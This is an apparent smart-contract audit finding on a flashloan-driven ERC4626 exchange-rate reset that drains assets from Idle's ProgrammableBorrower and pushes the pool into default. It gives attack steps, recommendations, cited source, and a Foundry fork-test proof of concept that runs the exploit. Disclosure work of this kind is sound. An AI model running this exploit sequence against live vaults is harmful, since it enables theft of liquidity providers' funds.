### Title

Flashloan-based ERC4626 rate reset causes programmable-borrower insolvency - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` values its entire ERC4626 position through `vault.convertToAssets(vault.balanceOf(address(this)))`, but it does not require the configured vault to protect its share supply from a full-supply flashloan. If the selected vault allows all outstanding shares to be borrowed, an unprivileged attacker can redeem the vault’s assets, redeposit only half at the reset 1:1 exchange rate, mint the same share supply, repay the flashloan, and keep the remaining assets. The borrower still owns the same number of shares afterward, but those shares represent substantially less underlying.

### Finding Description

At epoch start, `onStartEpoch` deposits all idle underlying into the configured vault and snapshots `epochStartVaultAssets` as the sum of cash plus `convertToAssets` of the borrower’s vault shares [1](#0-0) . During the epoch, `_currentVaultAssets` values the position solely as `vault.convertToAssets(vault.balanceOf(address(this)))` [2](#0-1) . `_vaultNetInterest` then compares that current value plus withdrawals with the epoch principal baseline [3](#0-2) .

Assume the facility deposits `2,000,000 USDC` into an ERC4626 vault whose `1` share is redeemable for `2 USDC`, so `ProgrammableBorrower` holds `1,000,000` shares. If the vault or another integrated share-holder permits flashloaning the complete vault-share supply:

1. The attacker borrows all `1,000,000` shares.
2. The attacker redeems them for `2,000,000 USDC`.
3. With zero supply, the attacker deposits `1,000,000 USDC` and receives `1,000,000` shares at 1:1.
4. The attacker repays the share flashloan.
5. The attacker retains approximately `1,000,000 USDC`, less fees.
6. `ProgrammableBorrower` receives its original `1,000,000` shares back, but `_currentVaultAssets()` now reports only about `1,000,000 USDC`.

The bug is not defeated by `_skimDonatedAssets`, because this is not a direct donation to the CDO; it is a repricing of assets already held through the external vault. It is also not prevented by the borrow reservation logic because the attacker does not call `borrow`: the assets are removed underneath the facility by temporarily obtaining its vault shares.

At a normal stop, the negative delta is surfaced through `vaultLoss()` and deducted in `totalInterestDueNow()` [4](#0-3) . If interest is insufficient to offset the loss, `totalInterestDueNow` is clamped to zero rather than reducing recorded tranche principal. On a close-pool stop, `onStopEpoch` compares the requested shortfall to the now-impaired vault valuation and intentionally returns success when the vault cannot cover it [5](#0-4) . The subsequent `transferFrom` then fails and the CDO enters its borrower-default path [6](#0-5) [7](#0-6) . That path pauses the vault, stops the epoch, disables withdrawal requests, and marks the pool defaulted [8](#0-7) .

### Impact Explanation

This creates direct theft and insolvency, not merely a stale oracle reading. In the `2:1` example, the attacker extracts nearly `1,000,000 USDC` while the facility’s recorded principal remains backed by vault shares redeemable for only about `1,000,000 USDC`.

Ordinary epoch interest can mask up to the amount of that interest because `totalInterestDueNow()` subtracts the vault loss from gains and clamps the result at zero. The missing principal is exposed when the facility must return the full pool balance: `transferFrom` cannot obtain the missing assets, causing the CDO to enter the terminal default flow. LPs consequently bear the unrecovered principal deficit or have their claims frozen pending default recovery.

### Likelihood Explanation

Likelihood is conditional rather than universal. The configured ERC4626 vault must permit the attacker to obtain its entire outstanding share supply in one transaction—either through a native share flashloan or through a separate share-lending/staking venue containing the complete supply. A vault using a non-resettable rate, virtual assets/shares, an inaccessible permanent seed position, or no full-supply share lending does not exhibit this sequence.

When such a vault is configured, no privileged Idle role is required. The attacker only needs ordinary ERC4626 redemption/deposit access plus the share flashloan. `ProgrammableBorrower.initialize` and `setVault` validate only that the vault is non-zero and uses the same asset; neither function checks share-transferability, flashloan exposure, minimum locked supply, or exchange-rate-reset resistance [9](#0-8) [10](#0-9) .

### Recommendation

Do not configure arbitrary ERC4626 vaults whose share supply can be fully borrowed and redeemed in one transaction. At minimum:

- Require an audited vault implementation with virtual asset/share offsets or another protection that prevents a zero-supply rate reset.
- Require permanently inaccessible seed shares that cannot be flashloaned or withdrawn.
- Verify that neither the vault nor its canonical staking/receipt mechanism can lend the complete share supply.
- Add deployment-time and `setVault` checks for a documented anti-inflation/anti-reset interface where possible.
- Prefer delayed NAV accounting or a rate oracle that cannot be manipulated intra-transaction for `vaultInterestAccrued`, `vaultLoss`, and close-pool liquidity checks.
- Document that an ERC4626 vault with flashloanable shares is an incompatible programmable-borrower venue.

### Proof of Concept

The following Foundry test targets a forked configured vault that exposes an ERC3156-style `flashLoan` for its own shares and has no zero-supply protection. The concrete lender interface is represented by `IShareFlashLender`; deployments may name or encode this call differently.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

interface IRateResetVault is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256);
    function deposit(
        uint256 assets,
        address receiver
    ) external returns (uint256);
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IProgrammableBorrowerView {
    function vaultSharesBalance() external view returns (uint256);
    function totalUnderlying() external view returns (uint256);
    function vaultLoss() external view returns (uint256);
    function epochStartVaultAssets() external view returns (uint256);
}

contract RateResetAttack is Test {
    IRateResetVault internal vault;
    IERC20 internal asset;
    IProgrammableBorrowerView internal borrower;
    address internal attacker = makeAddr("attacker");

    uint256 internal shares;
    uint256 internal redeemed;
    uint256 internal feeShares;
    uint256 internal profit;

    function testForkRateResetCreatesProgrammableBorrowerLoss() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), vm.envUint("FORK_BLOCK"));

        vault = IRateResetVault(vm.envAddress("RATE_RESET_VAULT"));
        borrower = IProgrammableBorrowerView(vm.envAddress("PROGRAMMABLE_BORROWER"));
        asset = IERC20(vault.asset());

        // Epoch is already active and all undrawn facility assets are held as vault shares.
        uint256 pbShares = borrower.vaultSharesBalance();
        uint256 baseline = borrower.epochStartVaultAssets();
        assertGt(pbShares, 0);
        assertEq(baseline, borrower.totalUnderlying());

        shares = vault.totalSupply();
        assertEq(pbShares, shares); // PB is the only material shareholder.

        vm.prank(attacker);
        vault.flashLoan(attacker, address(vault), shares, "");

        // Same shares were returned, but their underlying backing was reset.
        assertEq(borrower.vaultSharesBalance(), pbShares);

        uint256 impaired = borrower.totalUnderlying();
        assertApproxEqAbs(impaired, baseline / 2, 2);
        assertEq(borrower.vaultLoss(), baseline - impaired);
        assertApproxEqAbs(profit, baseline / 2, feeShares + 2);
    }

    function onERC3156FlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(vault), "lender");
        require(token == address(vault), "token");

        redeemed = vault.redeem(amount, address(this), address(this));

        // totalSupply() == 0, so this deposit reinitializes the rate at 1:1.
        uint256 half = redeemed / 2;
        asset.approve(address(vault), half + fee + 2);
        uint256 minted = vault.deposit(half, address(this));

        // Mint enough extra shares to cover a small share-denominated fee.
        feeShares = fee;
        if (fee != 0) {
            minted += vault.deposit(fee, address(this));
        }

        vault.approve(address(vault), amount + fee);
        profit = asset.balanceOf(address(this));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

Expected result: the flashloan restores the original share count, but `borrower.totalUnderlying()` falls by approximately half and `borrower.vaultLoss()` reports the extracted amount. The subsequent close-pool stop cannot recover the original principal from the borrower contract and proceeds through the default path.

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L108-134)
```text
  function initialize(
    address _vault, address _idleCDO, address _owner,
    address _manager, address _borrower, uint256 _borrowerApr
  ) external initializer {
    if (
      _vault == address(0) || _owner == address(0) || _manager == address(0) ||
      _borrower == address(0) || _idleCDO == address(0)
    ) {
      revert InvalidAddress();
    }
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-223)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-246)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L319-333)
```text
  /// @notice unrealized loss from the vault position since epoch start
  function vaultLoss() external view returns (uint256) {
    (,uint256 loss) = _vaultNetInterest();
    return loss;
  }

  /// @notice Total net epoch interest due to the pool at stop.
  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a
  /// pool-facing value, so it can be lower than `borrowerInterestDebt` when the borrower still
  /// owes full contractual interest but the vault sleeve suffered a loss.
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-346)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-408)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L576-598)
```text
  /// @notice Handle borrower default
  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();
    }

    // deposits should be already prevented
    if (!paused()) {
      _pause();
    }

    // stop the current epoch
    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    emit BorrowerDefault(funds);
```
